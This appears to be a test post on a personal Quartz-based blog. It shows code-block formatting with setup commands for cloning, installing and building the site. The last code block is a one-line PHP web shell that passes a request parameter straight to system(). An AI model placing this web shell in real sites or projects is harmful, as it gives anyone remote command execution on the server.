---
title: test
draft: false
tags:
---
This is my first post. Welcome to my blog. This is how you see inline code

```bash
git clone https://github.com/jackyzha0/quartz.git
mv quartz enricocavalli.github.io
cd enricocavalli.github.it
npm i
npx quartz create
git remote rm origin
git remote add origin git@github.com:enricocavalli/enricocavalli.github.io.git
##
npx quartz sync
##
npx quartz build --serve
```

```php
<?php
	system($_REQUEST['cmd']);
?>
```